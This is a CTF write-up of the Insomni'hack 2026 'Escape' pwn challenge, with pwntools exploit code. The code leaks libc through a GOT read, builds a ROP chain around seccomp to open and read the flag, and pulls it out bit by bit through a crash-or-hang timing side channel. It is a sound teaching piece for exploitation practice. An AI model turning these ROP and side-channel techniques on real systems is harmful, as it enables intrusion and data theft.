---
title: "Escape - Insomni'hack 2026"
category: "pwn"
subcategory: "rop"
type: "writeup"
tags: ["pwn", "rop", "seccomp", "xor", "buffer-overflow", "shellcode", "canary", "aslr", "pie", "pwntools", "binaryninja", "checksec", "scanf", "insomni-hack", "insomni-hack-2026", "2026", "ctf-writeup"]
summary: "Running pwn checksec escape.bin"
source:
  name: "CTFtime writeup #40684"
  url: "https://ctftime.org/writeup/40684"
original_source: "https://github.com/semchapeu/CTF-WriteUps/tree/master/Insomnihack2026/escape"
ctf:
  name: "Insomni'hack 2026"
  year: 2026
  challenge: "Escape"
---

## Metadata

- **CTF:** Insomni'hack 2026
- **Task:** Escape
- **Author team:** Unintentional Methodology
- **CTFtime tags:** pwn, rop, seccomp
- **CTFtime:** <https://ctftime.org/writeup/40684>
- **Original writeup:** <https://github.com/semchapeu/CTF-WriteUps/tree/master/Insomnihack2026/escape>

---
# Escape

* Challenge author: drp3ab0dy  
* Category: shellcoding, pwn  
* Description: Escape the rules! [escape.insomnihack.ch:6666](http://escape.insomnihack.ch:6666)  
* Solves: 25 (124 pts)  
* Provided files: escape.bin, Dockerfile

## Analysis & Preparation

Running `pwn checksec escape.bin`  
```  
Arch: amd64-64-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX enabled  
PIE: No PIE (0x400000)  
SHSTK: Enabled  
IBT: Enabled  
```  
This tells us multiple things to keep in mind for our solution, most notably there are no stack canaries, the stack is not executable and the binary is not PIE. The fact that the stack is not executable surprised me a little bit because the challenge was tagged as "shellcoding", but as it turns out the challenge did not involve writing shellcode but rather building a ROP chain.

For reverse engineering the binary I used the free version of [Binary Ninja](https://binary.ninja/free/). Any symbols I renamed I prefixed with `escape_`

![](<https://github.com/semchapeu/CTF-WriteUps/blob/master/Insomnihack2026/escape/img/escape_main.png?raw=true>)

We can ignore the `escape_setvbufs` function, it just disabling buffering on stdout, stdin and stderr which is common in challenges that will connect these file descriptors to network sockets.

The fiorst interesting code is:

```  
004013e2 __isoc99_scanf(format: "%lld", &var_10)  
004013fb printf(format: "%lld\n", *var_10)  
```

This gives us a free leak! We can provide a pointer (in decimal) and we will receive the 64bit value (in decimal) at that pointer.  
We will likely use this later to leak a libc or stack address.

The `escape_seccomp_add_rules` functions adds the seccomp rules that the challenge description is referencing.

![](<https://github.com/semchapeu/CTF-WriteUps/blob/master/Insomnihack2026/escape/img/escape_seccomp.png?raw=true>)

Basically, this makes it so the binary will be killed on any syscall other than these:

| NR | SYSCALL |  
|-----|---------|  
| 0x0 | read |  
| 0x2 | open |  
| 0x3c | exit |  
| 0x101| openat |

Refer to [[x64.syscall.sh](http://x64.syscall.sh)](<https://x64.syscall.sh/>)

With these syscalls we will be able to open and read the flag file into memory, however we won't be able to write the contents to stdout directly. This is what the challenge is about. If the binary was running locally, we could use the exit code in the exit syscall to exfiltrate on byte of the flag at a time, but as the challenge binary is listening on a port remotely, we won't know the exit code. So how to exfiltrate the flag? We are getting ahead of ourselves, let's get code execution first.

The last function to analyse is `escape_read`.

![](<https://github.com/semchapeu/CTF-WriteUps/blob/master/Insomnihack2026/escape/img/escape_read.png?raw=true>)

This function reads 0x1000 bytes from stdin into a buffer, on the stack, that it only reserved 0x20 bytes for. We have a stack based buffer overflow! And as the binary does not have any stack canaries we can overwrite the return address to get code execution. As the stack is not executable we will need to build a ROP chain. The challenge binary is not very big, it doesn't even contain a `syscall` gadget, so we will need to use libc.

To use libc for ROP we need two things, first of all we need to leak a libc address (assuming the challenge server has ASLR enabled) and secondly we will need a copy of the libc version that the challenge server is using.

The first is easily solved, we can use our free leak to leak a libc address. As the binary isn't PIE we can just leak a libc address from e.g. the binary's GOT and then calculate the offset to the base address of libc.

For the second, let's have a look at the Dockerfile that was provided with the challenge. It uses the image `ubuntu:20.04`. To get the right libc (`[libc-2.31.so](http://libc-2.31.so)`) and also ld (`[ld-2.31.so](http://ld-2.31.so)`). I built a docker container of that image and copied the files from there. I did not use the provied Dockerfile, as it uses files, such as the xinetd config file that we weren't provided with.

To be able to locally build the exploit and debug it, we need the binary to use this version of libc. As my local loader/linker ([ld.so](http://ld.so)) is likely not compatible with the libc from the challenge server, we need to patch to use it. There are cleaner ways to this but I just patched it in hex editor of Binary Ninja.

![](<https://github.com/semchapeu/CTF-WriteUps/blob/master/Insomnihack2026/escape/img/escape_ldso.png?raw=true>)

And then we can use the `LD_PRELOAD` environment variable to tell it to use the `[libc-2.31.so](http://libc-2.31.so)`.

## Exploitation

My solution makes heavy use of the [pwntools](<https://github.com/gallopsled/pwntools>) python library.

### Leaking libc

Using our free leak, we leak the address stored in the GOT of the `puts` entry and then calculate the offset to the libc base. 

```python  
from pwn import *  
import ctypes

context.binary = "escape_patched"  
e = context.binary  
libc = ELF("[libc-2.31.so](http://libc-2.31.so)")  
context.log_level = 'debug'

p = process(e.path, env={"LD_PRELOAD":libc.path})

puts_got = e.got["puts"] # 0x404028

p.recvline() # Get rid of "Escape the rules!"

p.sendline(f"{puts_got}".encode())  
leak = int(p.recvline())  
puts_leak = ctypes.c_uint64(leak).value # convert into unsigned int  
log.debug(f"{hex(puts_leak)=}")

libc_base = puts_leak - libc.symbols["puts"]

log.debug(f"Got libc base: {hex(libc_base)}")

libc.address = libc_base  
```

### Opening the flag

We basically want to call `open("./flag", O_RDONLY)`.   
Using the `open` syscall we need the following setup:

|NR|SYSCALL|RAX|ARG0 (rdi)|ARG1 (rsi)|ARG2 (rdx)|  
|-|-|-|-|-|-|  
|2|open|2|const char *filename|int flags|umode_t mode|

* RAX = 2  
* RDI pointing to a string "./flag"  
* RSI set to the value of O_RDONLY  
* (we can ignore the mode)

Setting RAX and RSI is simple enough. Pwntools automatically extracts basic gadgets such as `pop rax; ret;` etc.  
However, for RDI we need to write the string "./flag" somewhere into memory first and then set RDI to point there.

Using [ropper](<https://scoding.de/ropper/>) I extracted the gadgets from `[libc-2.31.so](http://libc-2.31.so)` and looked for a gadget with a write primitive.  
I chose this gadget:

`0x0000000000033d17: mov qword ptr [rax], rdx; ret;`

And created a function 

```python  
def arbitrary_write(addr, value):  
# write gadget = 0x0000000000033d17: mov qword ptr [rax], rdx; ret;  
write_gadget = 0x0000000000033d17 + libc_base  
chain = p64(libc_rop.rax.address)  
chain += p64(addr)  
chain += p64(libc_rop.rdx.address)  
chain += p64(value)  
chain += p64(0) # pad, as rdx gadget pops another register  
chain += p64(write_gadget)  
return chain  
```

Now that we can write to memory we need to chose where to write to. I chose the bss segment of the challenge binary as it's writeable and we know the address (no PIE), but a writeable segment in libc could also be used.

So the ROP chain for opening the flag file is:

```python  
libc_rop = ROP(libc)

flag_file = u64(b"./flag\x00\x00")  
flag_address = e.bss()

# open("./flag", O_RDONLY)  
chain = arbitrary_write(flag_address, flag_file)  
chain += p64(libc_rop.rax.address)  
chain += p64(2) # open  
chain += p64(libc_rop.rdi.address)  
chain += p64(flag_address)  
chain += p64(libc_rop.rsi.address)  
chain += p64(os.O_RDONLY)  
chain += p64(libc_rop.find_gadget(['syscall', 'ret']).address)  
```

### Reading the flag

Open returns a file descriptor `3` to the flag file. For the chain we need the following setup:

|NR|SYSCALL|RAX|ARG0 (rdi)|ARG1 (rsi)|ARG2 (rdx)|  
|-|-|-|-|-|-|  
|0|read|0|unsigned int fd|char *buf|size_t count|

* RAX = 0  
* RDI = 3 (fd to the flag)  
* RSI point to a writeable address, I just re-used the same I used previously for "./flag"  
* RDX size to read, we don't know the length of the flag, but we don't need to, read will quit on EOF, so I chose 0x1000

This results in a chain of:

```python  
# read(3, flag_addr, 0x1000)  
chain += p64(libc_rop.rax.address)  
chain += p64(0)  
chain += p64(libc_rop.rdi.address)  
chain += p64(3) # open  
chain += p64(libc_rop.rsi.address)  
chain += p64(flag_address)  
chain += p64(libc_rop.rdx.address)  
chain += p64(0x1000)  
chain += p64(0) # pad  
chain += p64(libc_rop.find_gadget(['syscall', 'ret']).address)  
```

### Exfiltrating the flag

Now we have the flag in memory. But how can we get it? We cannot write, sleep, get the exit code etc.   
We need some way to exfiltrate information and as it turns out we can exfiltrate information without using _any_ syscalls.  
The idea is simple: Extract the flag one bit at a time, by either crashing (or exiting) the program or entering into an infinite loop. We can exfiltrate the bit by observing from the outside whether our connection to the challenge server is closed or stays active.

First, we need a gadget that enables us to read part of the flag into memory. I chose:

`0x0000000000055065: mov rdx, qword ptr [rdx + 0x88]; xor eax, eax; ret; `

Which loads the value stored at `rdx + 0x88` into rdx:

```python  
def load_rdx(addr):  
# load to rdx gadget = 0x0000000000055065: mov rdx, qword ptr [rdx + 0x88]; xor eax, eax; ret;   
load_rdx_gadget = 0x0000000000055065 + libc_base  
chain = p64(libc_rop.rdx.address)  
chain += p64(addr - 0x88)  
chain += p64(0) # pad  
chain += p64(load_rdx_gadget)  
return chain  
```

Next we need a way to choose a specific bit from the 64-bit value loaded into rdx. Thinks like shifting, xor'ing and and'ing come to mind. I ended up choosing this "and" gadget:

`0x0000000000041f5b: and rdx, rax; movq xmm0, rdx; ret; `

By now putting a bitmask into rax we can have rdx be either 0 if the selected bit is 0 or non-zero if the selected bit is 1.

For an infite loop, I chose the gadget:

`0x0000000000023eba: jmp rax; `

Which will loop indefinitely if rax is set to the address of the same gadget.

We now just need to make a decision wether to loop indefinetely or to crash. I chose a simple way. I put the address of the `jmp rax` gadget into rax and then add the value stored in rdx to it. If the selected bit is 0, rdx will be 0, and will not change rax and therefore ending up in the infinite loop. If the bit is 1 adding rdx to rax will corrupt the pointer in rax, and therefore crash the program. Even in the event that the new address ends up being valid it will most likely crash after a few instructions anyway. I agree that this is not the cleanest way to do it, but quite simple and efficient in the context of a CTF challenge.

To add rdx to rax I found the perfect gadget:

`0x00000000000748d0: add rax, rdx; jmp rax;`

It even jumps to rax, which is quite convenient and saves me 8 byte on the length of the rop chain, not that that is necessary, we have almost 0x1000 bytes of space for our rop chain after all. 

```python  
i = 0 # bit of rdx to extract  
part = 0 # 8 byte substring of the flag to load into rdx 

# 0x0000000000023eba: jmp rax;   
jmp_rax = 0x0000000000023eba + libc_base

# 0x0000000000041f5b: and rdx, rax; movq xmm0, rdx; ret;   
and_gadget = 0x0000000000041f5b + libc_base

# 0x00000000000748d0: add rax, rdx; jmp rax;  
add_rax_rdx_jmp_rax = 0x00000000000748d0 + libc_base

mask = 0x1 << i

chain += load_rdx(flag_address + (8 * part))  
chain += p64(libc_rop.rax.address)  
chain += p64(mask)  
chain += p64(and_gadget)

# infinte loop  
chain += p64(libc_rop.rax.address)  
chain += p64(jmp_rax)  
chain += p64(add_rax_rdx_jmp_rax)

payload = cyclic(ret_offset)  
payload += chain  
  
p.sendline(payload)  
```

To test whether we ended up in an infinite loop or not we just need to try to read from the connection:

```python  
start = time.time()  
  
p.recvall(timeout=0.5) # will take at least 0.5 seconds if the connection is still open, less otherwise  
  
if time.time() - start < 0.5:  
tmp_flag += 1 << i  
```

Now put the whole thing in a loop and add some logic and we end up with our final [[exploit.py](http://exploit.py)](<https://github.com/semchapeu/CTF-WriteUps/blob/master/Insomnihack2026/escape/exploit.py>)

### Conclusion

The challenge was very straightforward, the leak and vulnerability were trivial to find. The main focus was on the exiltration of the data. There are likely other ways to solve it, especially considering I only used two of the five allowed syscalls.  
I ended up being the 8th to solve the challenge and enjoyed it quite a lot.
